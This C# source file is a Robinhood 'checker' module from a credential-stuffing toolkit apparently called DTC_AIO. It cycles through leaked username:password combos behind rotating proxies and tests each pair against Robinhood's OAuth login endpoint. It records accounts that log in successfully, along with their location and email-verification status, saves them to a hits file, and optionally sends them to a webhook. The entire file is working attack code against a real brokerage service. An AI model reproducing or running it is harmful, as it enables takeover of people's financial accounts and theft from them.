using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using DTCCUI;
using Leaf.xNet;

namespace DTC_AIO
{
    internal class Robinhoodmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("origin", "https://robinhood.com");
                            req.AddHeader("referer", "https://robinhood.com/");
                            req.AddHeader("x-robinhood-api-version", "1.411.9");
                            var str =
                                "{\"grant_type\":\"password\",\"scope\":\"internal\",\"client_id\":\"c82SH0WZOsabOXGP2sxqcj34FxkvfnWRZBKlBjFS\",\"expires_in\":86400,\"device_token\":\"" +
                                "b50a336c-7538-4ee6-9e20-6ba9d46123de" + "\",\"username\":\"" + array[0] +
                                "\",\"password\":\"" + array[1] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse =
                                req.Post("https://api.robinhood.com/oauth2/token/", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("Unable to log in with provided credentials"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("access_token"))
                                {
                                    var access_token = Parse(strResponse, "token\": \"", "\"");
                                    req.AddHeader("authorization", "Bearer " + access_token);
                                    var text3 = req.Get("https://api.robinhood.com/user/").ToString();
                                    var text4 = Parse(text3, "locality\":\"", "\"");
                                    var text5 = Parse(text3, "email_verified\":", ",\"");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Robinhood_hits",
                                        array[0] + ":" + array[1] + " | Location: " + text4 + " | Email Verified: " +
                                        text5);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Robinhood",
                                            array[0] + ":" + array[1] + " | Location: " + text4 +
                                            " | Email Verified: " + text5);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(
                                            array[0] + ":" + array[1] + " | Location: " + text4 +
                                            " | Email Verified: " + text5, "Robinhood Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}